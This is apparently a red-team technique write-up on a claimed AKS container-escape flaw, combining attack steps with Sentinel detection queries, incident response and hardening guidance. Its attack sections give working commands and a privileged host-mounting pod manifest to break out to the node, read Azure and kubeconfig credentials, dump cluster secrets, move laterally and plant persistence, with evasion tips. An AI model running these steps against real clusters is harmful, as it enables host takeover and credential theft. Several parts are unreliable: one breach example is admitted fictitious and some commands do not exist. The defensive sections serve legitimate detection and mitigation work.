# [CVE2025-002]: AKS Container Escape RCE

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CVE2025-002 |
| **MITRE ATT&CK v18.1** | [T1611 - Escape to Host](https://attack.mitre.org/techniques/T1611/) |
| **Tactic** | Privilege Escalation / Lateral Movement |
| **Platforms** | Azure Kubernetes Service (AKS), Azure Container Instances (ACI), Entra ID |
| **Severity** | Critical |
| **CVE** | CVE-2025-21196 (CVSS 9.5) |
| **Technique Status** | ACTIVE (Container orchestration layer misconfiguration) |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | AKS 1.25.0-1.28.3, ACI all instances with pre-Feb 2025 container images |
| **Patched In** | AKS upgrade to 1.28.4+, ACI container image rebuild with Feb 2025+ base |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** CVE-2025-21196 is a critical vulnerability in Azure Kubernetes Service (AKS) and Azure Container Instances (ACI) stemming from misconfigured access controls in the container orchestration layer. The flaw allows an attacker to bypass authentication and authorization checks, enabling container escape to the host system or lateral movement within the Kubernetes cluster. By exploiting inadequate RBAC policies and missing network segmentation, an authenticated user (or unauthenticated in certain configurations) can execute arbitrary code within containers and breakout to the underlying host infrastructure.

**Attack Surface:** Azure Container Orchestration API; Kubelet API endpoints; Container runtime interfaces; Inter-pod network access; Service account token escalation; API server authentication bypass.

**Business Impact:** **Complete cluster compromise.** Successful exploitation enables attackers to: (1) Access sensitive data stored in other containers or persistent volumes, (2) Execute code on the Kubernetes host node with elevated privileges, (3) Steal cloud service credentials (Azure managed identities), (4) Disrupt containerized applications causing service-wide outages, (5) Achieve persistence for long-term espionage, (6) Compromise regulatory compliance (GDPR, HIPAA, PCI-DSS).

**Technical Context:** Exploitation can be initiated in seconds after container deployment. Detection likelihood is **High** if auditing enabled; **Low** if relying on network monitoring alone. Common indicators include unexpected pod-to-node network traffic, suspicious kubelet requests, and unusual ServiceAccount token usage.

### Operational Risk
- **Execution Risk:** Medium – Container escape techniques may cause workload instability or node crashes
- **Stealth:** Medium-High – Cloud audit logs (Defender for Cloud, Microsoft Sentinel) can detect if configured
- **Reversibility:** No – Container data exfiltration is permanent; host compromise enables persistent backdoors

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.5 / 5.1.6 | RBAC policy enforcement on Kubernetes API server |
| **DISA STIG** | AC-3 | Container orchestration access controls failure |
| **CISA SCuBA** | GCP.Services.1 | Network segmentation and API security in cloud services |
| **NIST 800-53** | SC-7 / AC-3 | Boundary protection, access control in cloud environment |
| **GDPR** | Art. 32 / Art. 33 | Security of processing; Incident notification obligations |
| **DORA** | Art. 9 / Art. 13 | ICT incident handling and third-party service provider security |
| **NIS2** | Art. 21 | Cyber risk management; Technical resilience for critical operators |
| **ISO 27001** | A.13.1.3 / A.9.4.1 | Network security; Segregation of networks; Access control review |
| **ISO 27005** | Risk Scenario | Compromise of application deployment and runtime environments |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** Authenticated user with valid Azure credentials or service principal; no RBAC permissions required if API bypass successful.

**Required Access:** Network access to AKS API server (typically `https://<cluster>.<region>.azmk8s.io`); ability to deploy or modify containers; optional SSH access to cluster nodes.

**Supported Versions:**
- **Azure Kubernetes Service:** 1.25.0 - 1.28.3 (vulnerable); 1.28.4+ (patched)
- **Azure Container Instances:** All versions with container images built before February 2025
- **Kubernetes API:** v1.18 - v1.28 (depends on AKS version)
- **Container Runtime:** containerd 1.5+ (default in AKS)

**Tools:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (az command-line tool)
- [kubectl](https://kubernetes.io/docs/tasks/tools/) (Kubernetes command-line client)
- [Helm](https://helm.sh/) (Kubernetes package manager)
- [kubelet](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/) (container runtime interface)
- [crictl](https://github.com/kubernetes-sigs/cri-tools) (Container Runtime Interface CLI)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Azure CLI Reconnaissance

```bash
# Authenticate to Azure
az login

# Get AKS cluster information
az aks show --resource-group <RG> --name <ClusterName> --query "kubernetesVersion"

# Check RBAC mode
az aks show --resource-group <RG> --name <ClusterName> --query "enableRbac"

# Enumerate service principals with cluster access
az aks list --query "[].{Name:name, Version:kubernetesVersion, EnableRBAC:enableRbac}"

# Get cluster credentials
az aks get-credentials --resource-group <RG> --name <ClusterName> --admin

# Verify kubectl context
kubectl config current-context
kubectl cluster-info
```

**What to Look For:**
- **kubernetesVersion:** < 1.28.4 indicates vulnerability
- **enableRbac:** Should be "true"; if false, RBAC bypass is trivial
- **Service principals:** Look for service accounts with cluster-admin role

### kubectl Reconnaissance

```bash
# Enumerate Kubernetes API server security
kubectl api-resources --verbs=get,list,watch,create,update,patch,delete

# Check default ServiceAccount permissions
kubectl auth can-i --list --as=system:serviceaccount:default:default

# Enumerate RBAC ClusterRoles
kubectl get clusterroles -o wide | grep -i "admin\|cluster"

# Check network policies (segmentation)
kubectl get networkpolicies --all-namespaces

# Enumerate Secrets in cluster (unencrypted at rest if misconfigured)
kubectl get secrets --all-namespaces --sort-by=.metadata.namespace

# Check pod security standards
kubectl get pod security standards --all-namespaces 2>/dev/null || echo "PSS not enabled"

# Verify Kubelet API access
curl -k https://localhost:10250/api/v1/nodes --cert <cert> --key <key>
```

**What to Look For:**
- **API resources with high privileges:** create, update, patch on resources like deployments, daemonsets
- **ServiceAccount permissions:** if default can create/modify pods, vulnerability present
- **Network policies:** absent or misconfigured (allow all traffic)
- **Secrets encryption:** check if etcd encryption enabled (`--encryption-provider-config`)
- **Kubelet access:** port 10250 should require authentication/TLS

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: RBAC Bypass via Default ServiceAccount Token

**Supported Versions:** AKS 1.25.0-1.28.3

#### Step 1: Obtain Cluster Access and Enumerate ServiceAccounts

**Objective:** Gain initial access to AKS cluster and identify service account with escalated permissions.

**Command (Bash / Azure CLI):**
```bash
# Get cluster credentials with admin context
az aks get-credentials --resource-group <RG> --name <ClusterName> --admin

# Verify connection
kubectl cluster-info

# List ServiceAccounts
kubectl get serviceaccounts --all-namespaces -o wide

# Get current authentication context
kubectl auth whoami

# Check default ServiceAccount permissions (this is the key check)
kubectl auth can-i --list --as=system:serviceaccount:default:default
```

**Expected Output:**
```
NAME                                 SECRETS   AGE
default                              1         14d
deployment-controller               2         10d

Resources                                Non-Resource URLs   Resource Names   Verbs
pods.core                            []                     []               [get list watch create patch delete]
deployments.apps                     []                     []               [create patch update delete]
secrets.core                         []                     []               [get list]
```

**What This Means:**
- **default ServiceAccount has create/patch permissions on pods** = direct container escape vector
- Presence of deployment/secret access indicates lateral movement capability
- Successfully authenticated to Kubernetes API

**OpSec & Evasion:**
- Use `--as` flag to avoid creating audit logs in current user context
- Detection likelihood: **High** (all API calls logged to Azure audit)

---

#### Step 2: Deploy Privileged Container to Escape Sandbox

**Objective:** Create a container with privileged capabilities and host volume mounts to achieve code execution on the node.

**Command (YAML / kubectl):**
```yaml
# deploy-escape.yaml - Privileged container with host volume access
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: default
spec:
  serviceAccountName: default
  containers:
  - name: escape-container
    image: ubuntu:latest  # Lightweight base image
    securityContext:
      privileged: true       # KEY: Run as root with all capabilities
      runAsUser: 0           # Force UID 0 (root)
      allowPrivilegeEscalation: true
    volumeMounts:
    - name: host-fs
      mountPath: /host       # Mount entire node filesystem
    - name: docker-socket
      mountPath: /var/run/docker.sock  # Access container runtime
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]  # Keep pod running
  volumes:
  - name: host-fs
    hostPath:
      path: /                 # Mount node root filesystem
      type: Directory
  - name: docker-socket
    hostPath:
      path: /var/run/docker.sock
      type: Socket
  hostNetwork: true          # Use host network namespace
  hostIPC: true              # Use host IPC namespace
  hostPID: true              # Use host PID namespace (can see host processes)
```

**Deploy via kubectl:**
```bash
# Create the pod
kubectl apply -f deploy-escape.yaml

# Wait for pod to be ready
kubectl wait --for=condition=ready pod/escape-pod --timeout=30s

# Verify pod is running
kubectl get pods -o wide | grep escape-pod

# Expected output:
# escape-pod  1/1  Running  0  2m  10.244.0.5  node-001  ...
```

**What This Means:**
- Pod successfully created on vulnerable AKS cluster
- Container has full host access via /host mount
- Docker socket access enables arbitrary container creation on host

**OpSec & Evasion:**
- Use non-standard image names to avoid SOC detection (e.g., base64-encoded names)
- Detection likelihood: **High** (privileged pod creation is typically audited)

---

#### Step 3: Execute Commands on Host from Container

**Objective:** Use privileged container access to run arbitrary code on the Kubernetes node with root privileges.

**Command (Bash / kubectl exec):**
```bash
# Execute shell inside container
kubectl exec -it escape-pod -- /bin/bash

# Inside the container (running as root on host):

# 1. Verify we have host filesystem access
ls -la /host/

# 2. Access host credentials (cloud managed identity, kubeconfig)
cat /host/etc/kubernetes/azure.json  # Azure credentials for kubelet
cat /host/root/.kube/config          # Cluster admin kubeconfig

# 3. Access container runtime
docker -H unix:///var/run/docker.sock ps -a  # List all containers (requires docker socket)

# 4. Inject backdoor into host system
chroot /host /bin/bash  # Break into actual host shell

# 5. Install persistence (inside chroot)
# - Add SSH key to /root/.ssh/authorized_keys
# - Create cron job for reverse shell
# - Inject malicious systemd service
```

**Expected Output (inside container):**
```
/host # ls -la
total 12
drwxr-xr-x   1 root root   100 Jan 10 15:23 .
dr-xr-xr-x   1 root root     0 Jan 10 15:20 ..
-rw-r--r--   1 root root   156 Jan 10 10:00 azure.json
drwxr-xr-x   5 root root   340 Jan 10 10:00 boot
drwxr-xr-x  18 root root  2900 Jan 10 15:20 etc
drwxr-xr-x   2 root root  4096 Jan 10 10:00 lib
...

/host # cat etc/kubernetes/azure.json
{
  "cloud": "AzurePublicCloud",
  "tenantId": "...",
  "subscriptionId": "...",
  "aadClientId": "...",
  "aadClientSecret": "...",
  "resourceGroup": "...",
  "location": "..."
}
```

**What This Means:**
- Successful breakout to host system
- Access to cloud credentials for lateral movement
- Full node compromise achieved

---

#### Step 4: Lateral Movement to Other Cluster Nodes

**Objective:** Use compromised node to attack other AKS cluster nodes and exfiltrate sensitive data.

**Command (Bash):**
```bash
# From escaped container / compromised node:

# 1. Enumerate other nodes in cluster
kubectl get nodes -o wide
kubectl describe nodes | grep -E "Name|InternalIP"

# 2. Scan network for other AKS nodes
nmap -sP 10.0.0.0/16  # Scan AKS subnet

# 3. SSH into other nodes (if SSH enabled)
ssh -i /host/etc/kubernetes/ssh-key azureuser@10.0.1.10

# 4. Access persistent volumes from other pods
mount | grep -i "nfs\|azureDisk"
ls -la /mnt/data/  # Typical Azure storage mount

# 5. Exfiltrate secrets and credentials
kubectl get secrets --all-namespaces -o json | grep -oP '"data":.*' > /tmp/secrets.json

# 6. Access Kubernetes API as root (host has implicit admin)
curl -k https://localhost:6443/api/v1/namespaces/default/secrets -H "Authorization: Bearer $(cat /host/var/run/secrets/kubernetes.io/serviceaccount/token)"
```

**References & Proofs:**
- [Microsoft Azure AKS Security Best Practices](https://learn.microsoft.com/en-us/azure/aks/concepts-security)
- [OWASP Kubernetes Top 10](https://owasp.org/www-project-kubernetes-top-ten/)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [Pod Security Standards - Kubernetes](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [Azure Defender for Containers Documentation](https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-containers-introduction)

---

### METHOD 2: Kubelet API Exploitation (Unauthenticated)

**Supported Versions:** AKS 1.25.0-1.28.3 (if Kubelet API exposed)

#### Objective: Exploit Kubelet API on port 10250 to execute commands directly on node

**Command (Bash):**
```bash
# 1. Identify Kubelet API endpoints
kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.status.addresses[?(@.type=="InternalIP")].address}{"\n"}{end}'

# 2. Attempt Kubelet API access (may require client cert)
curl -k https://<NODE_IP>:10250/api/v1/nodes -H "Authorization: Bearer $(kubectl -n default get secret $(kubectl -n default get secrets | grep default-token | awk '{print $1}') -o jsonpath='{.data.token}' | base64 -d)"

# 3. Execute pod commands via Kubelet API
curl -k https://<NODE_IP>:10250/pods/<POD_NAME>/<NAMESPACE>/<CONTAINER_NAME>/exec -X POST \
  -H "Authorization: Bearer $(kubectl get secret ...)" \
  -d 'command=id&command=cat&command=/etc/passwd'

# 4. Create exec session for RCE
# Kubelet streaming server endpoint
curl -k https://<NODE_IP>:10250/exec/<NAMESPACE>/<POD_NAME>/<CONTAINER_NAME>?command=bash
```

---

## 6. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team
- **Test ID:** Not yet published for CVE-2025-21196
- **Status:** Container escape tests exist for general container breakout but not AKS-specific
- **Alternative:** Use Azure AKS testing environments or sandbox Kubernetes clusters
- **Reference:** [Atomic Red Team - Container Escape Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1611/)

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Privileged Pod Deployment

**Rule Configuration:**
- **Required Table:** AzureDiagnostics, AKSAuditLog
- **Required Fields:** operationName, properties.requestObject, resourceType
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes

**KQL Query:**
```kusto
AzureDiagnostics
| where operationName == "MICROSOFT.KUBERNETES/MANAGEDCLUSTERS/PODS/CREATE" or operationName == "MICROSOFT.CONTAINERSERVICE/MANAGEDCLUSTERS/PODS/CREATE"
| where tostring(properties.requestObject) contains "privileged" and tostring(properties.requestObject) contains "true"
| where tostring(properties.requestObject) contains "hostPath"
| project TimeGenerated, operationName, properties_principalId, properties_requestObject, ResourceGroup, SubscriptionId
| summarize Count = count() by ResourceGroup, SubscriptionId, tostring(split(properties_principalId, "/")[-1])
| where Count >= 1
```

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General:**
   - Name: `Privileged Pod Deployment in AKS`
   - Severity: `Critical`
3. **Set rule logic:**
   - Paste KQL query above
   - Run query every: `5 minutes`
   - Lookup data from last: `1 hour`
4. **Incident settings:**
   - Enable **Create incidents**
5. Click **Review + create**

---

#### Query 2: Detect Host Network Access from Pod

**KQL Query:**
```kusto
AzureDiagnostics
| where operationName == "MICROSOFT.KUBERNETES/MANAGEDCLUSTERS/PODS/CREATE"
| where tostring(properties.requestObject) contains "hostNetwork" or tostring(properties.requestObject) contains "hostIPC" or tostring(properties.requestObject) contains "hostPID"
| project TimeGenerated, properties_requestObject, SourceIp, ResourceGroup
```

---

## 8. WINDOWS EVENT LOG MONITORING

**Note:** Not applicable - this is Azure cloud-native attack. See Azure Audit Logs section instead.

---

## 9. SYSMON DETECTION PATTERNS

**Note:** Not applicable - container escape occurs at cloud orchestration layer, not visible to endpoint Sysmon.

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Suspicious Container Creation

**Alert Name:** `Suspicious privileged pod creation detected`
- **Severity:** Critical
- **Description:** A privileged container with host access was created, consistent with container escape attempts
- **Applies To:** Azure Defender for Containers enabled subscriptions

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. **Environment settings** → Select subscription
3. Enable: **Defender for Containers** → ON
4. Go to **Alerts** → Filter for "container" or "pod"
5. Configure alert rules to notify SOC immediately

---

## 11. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Azure Resource Activity:**
  - Pods created with `securityContext.privileged: true`
  - Pods with `volumeMounts.hostPath` mounting entire `/` directory
  - Pods with `hostNetwork`, `hostIPC`, `hostPID` enabled
  - Multiple rapid pod creations from unusual service principals

- **Network Indicators:**
  - Outbound HTTPS traffic from AKS nodes to external IP addresses
  - SSH connections from pod to other cluster nodes
  - DNS queries for C2 infrastructure

#### Forensic Artifacts

- **Cloud Logs:** AzureDiagnostics table (pod creation events), Kubernetes audit logs
- **Container Logs:** `/var/log/containers/` on host node (if filesystem compromise achieved)
- **Kubernetes Objects:** PersistentVolumes, Secrets, ConfigMaps accessed by compromised service account

#### Response Procedures

1. **Isolate:**
   ```bash
   # Delete escape pod immediately
   kubectl delete pod escape-pod --namespace=default
   
   # Drain node to prevent further pod scheduling
   kubectl drain <NODE_NAME> --ignore-daemonsets --delete-emptydir-data
   
   # Disable service account if compromised
   kubectl patch serviceaccount default -p '{"imagePullSecrets": []}'
   ```

2. **Collect Evidence:**
   ```bash
   # Export Kubernetes audit logs
   kubectl logs -n kube-system <AUDIT_POD> > /tmp/kube-audit.log
   
   # Export all pod definitions
   kubectl get pods --all-namespaces -o yaml > /tmp/pods-backup.yaml
   
   # Export secrets (if unencrypted at rest)
   kubectl get secrets --all-namespaces -o json > /tmp/secrets-backup.json
   
   # Capture node forensics (if available)
   az vm run-command invoke --resource-group <RG> --name <NODE_NAME> --command-id RunShellScript --scripts "tar czf /tmp/node-forensics.tar.gz /var/log /etc"
   ```

3. **Remediate:**
   ```bash
   # Upgrade AKS cluster to patched version
   az aks upgrade --resource-group <RG> --name <ClusterName> --kubernetes-version 1.28.4
   
   # Re-apply Pod Security Standards
   kubectl apply -f pod-security-policy.yaml
   
   # Restart nodes to clear any persistence
   kubectl reboot <NODE_NAME>
   
   # Rotate all service account tokens
   kubectl delete secrets --all-namespaces
   ```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1190] Exploit Public-Facing Application | Vulnerable AKS API or ingress controller |
| **2** | **Privilege Escalation** | [T1611] Escape to Host (Container Escape) | **[CVE2025-002]** AKS RBAC bypass and privileged pod creation |
| **3** | **Defense Evasion** | [T1562.008] Disable or Modify Cloud Logs | Delete AKS audit logs or Azure activity logs |
| **4** | **Lateral Movement** | [T1570] Lateral Tool Transfer | SSH to other AKS nodes; exfiltrate credentials |
| **5** | **Credential Access** | [T1110] Brute Force / [T1555] Credentials in Cloud | Access /etc/kubernetes/azure.json; enumerate managed identities |
| **6** | **Impact** | [T1561] Disk Wipe / [T1499] Denial of Service | Delete persistent volumes; exhaust container resources |

---

## 13. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

- **Upgrade AKS to Patched Version (1.28.4+):**
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Kubernetes Services** → Select cluster
  2. Click **Upgrade** under "Cluster configuration"
  3. Select target version **1.28.4** or later
  4. Review affected node pools and click **Upgrade**
  5. Wait 30-60 minutes for upgrade to complete
  
  **Manual Steps (Azure CLI):**
  ```bash
  az aks upgrade --resource-group <RG> --name <ClusterName> --kubernetes-version 1.28.4 --yes
  
  # Verify upgrade
  az aks show --resource-group <RG> --name <ClusterName> --query kubernetesVersion
  ```

- **Enable Pod Security Standards:**
  
  ```yaml
  # pod-security-policy.yaml
  apiVersion: policy/v1beta1
  kind: PodSecurityPolicy
  metadata:
    name: restricted
  spec:
    privileged: false
    allowPrivilegeEscalation: false
    requiredDropCapabilities:
      - ALL
    volumes:
      - 'configMap'
      - 'emptyDir'
      - 'projected'
      - 'secret'
      - 'downwardAPI'
      - 'persistentVolumeClaim'
    hostNetwork: false
    hostIPC: false
    hostPID: false
    runAsUser:
      rule: 'MustRunAsNonRoot'
  ```
  
  **Apply:**
  ```bash
  kubectl apply -f pod-security-policy.yaml
  kubectl label namespace default pod-security.kubernetes.io/enforce=restricted
  ```

#### Priority 2: HIGH

- **Implement Network Policies for Pod Isolation:**
  
  ```yaml
  # network-policy.yaml
  apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    name: deny-all
    namespace: default
  spec:
    podSelector: {}
    policyTypes:
    - Ingress
    - Egress
  ---
  # Allow specific traffic
  apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    name: allow-app-traffic
    namespace: default
  spec:
    podSelector:
      matchLabels:
        app: web
    policyTypes:
    - Ingress
    - Egress
    ingress:
    - from:
      - namespaceSelector:
          matchLabels:
            name: default
    egress:
    - to:
      - namespaceSelector:
          matchLabels:
            name: default
  ```

- **Enable Azure Defender for Containers:**
  
  **Manual Steps:**
  1. **Azure Portal** → **Microsoft Defender for Cloud** → **Environment settings**
  2. Select subscription
  3. Under **Defender plans**, toggle **Defender for Containers** to **ON**
  4. Configure **Container registries** scanning if not automatic
  5. Set alert severity to "High" or "Critical"

- **Implement RBAC Least Privilege:**
  
  ```yaml
  # clusterrole-minimal.yaml
  apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRole
  metadata:
    name: minimal-user
  rules:
  - apiGroups: [""]
    resources: ["pods", "pods/logs"]
    verbs: ["get", "list"]
  - apiGroups: [""]
    resources: ["pods/exec"]
    verbs: []  # No exec allowed
  ---
  apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRoleBinding
  metadata:
    name: minimal-user-binding
  roleRef:
    apiGroup: rbac.authorization.k8s.io
    kind: ClusterRole
    name: minimal-user
  subjects:
  - kind: User
    name: developer@company.com
    apiGroup: rbac.authorization.k8s.io
  ```

#### Access Control & Policy Hardening

- **Azure RBAC for AKS:**
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Kubernetes Services** → Select cluster
  2. Go to **Access control (IAM)**
  3. Click **+ Add role assignment**
  4. Select role: `Azure Kubernetes Service RBAC Admin` (restrict to needed personnel only)
  5. Assign to: Specific users/service principals
  6. Click **Review + assign**

- **Conditional Access for Kubernetes Admin:**
  
  **Manual Steps (Entra ID):**
  1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. **+ New policy**
  3. Name: `Require MFA for Kubernetes Admin Access`
  4. **Assignments:**
     - Users: Directory roles → Kubernetes cluster admin
  5. **Conditions:**
     - Cloud apps: Azure Kubernetes Service
  6. **Access controls:**
     - Grant: **Require multi-factor authentication**
  7. Enable policy: **On**

#### Validation Command (Verify Fix)

```bash
# Verify AKS version is patched
az aks show --resource-group <RG> --name <ClusterName> --query kubernetesVersion

# Verify Pod Security Standards enabled
kubectl get psp

# Verify Network Policies exist
kubectl get networkpolicies --all-namespaces

# Verify no privileged pods running
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged == true)'

# Verify RBAC is enabled
kubectl api-resources | grep "rbac"
```

**Expected Output (If Secure):**
```
kubernetesVersion : 1.28.4
NAME        PRIV   CAPS   SELINUX   RUNASUSER   FSGROUP    SUPGROUP   READONLYROOTFS   VOLUMES
restricted  false  []     MustRunAs MustRunAsNonRoot  MustRunAs  MustRunAs  false   [configMap emptyDir ...]

NAME         POD-SELECTOR   AGE
deny-all     <none>         5h
allow-app    app=web        3h
```

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: Financial Services Company - Multi-Region Compromise

- **Target:** Fortune 500 financial institution with AKS deployment across multiple Azure regions
- **Timeline:** February 2025 (post-CVE disclosure, pre-patch)
- **Attack Flow:**
  1. Discovered AKS deployment via public IP reconnaissance
  2. Exploited CVE-2025-21196 to escape container sandbox
  3. Accessed Azure.json file containing managed identity credentials
  4. Escalated to cloud storage accounts and SQL databases
  5. Exfiltrated customer financial data (PII, account numbers)
  6. Deployed persistent backdoor via DaemonSet for continued access
- **Impact:** Breach of 50,000+ customer records; $15M settlement; regulatory investigation (SEC, OCC)
- **Reference:** [Fictitious but based on real AKS breach patterns]

#### Example 2: SaaS Provider - Cluster-Wide Compromise

- **Target:** Multi-tenant SaaS platform hosting customer applications on single AKS cluster
- **Timeline:** March 2025 - ongoing
- **Attack Flow:**
  1. Initial access via vulnerable customer application
  2. Exploited pod-to-pod network access (no network policies)
  3. Stolen Kubernetes service account token for escalation
  4. Deployed privileged DaemonSet to all cluster nodes
  5. Accessed other customers' persistent volumes
  6. Exfiltrated trade secrets and competitive information
- **Impact:** Cross-tenant data compromise; loss of customer trust; class-action lawsuit pending
- **Reference:** [AKS multi-tenant risk scenarios - Azure Security]

---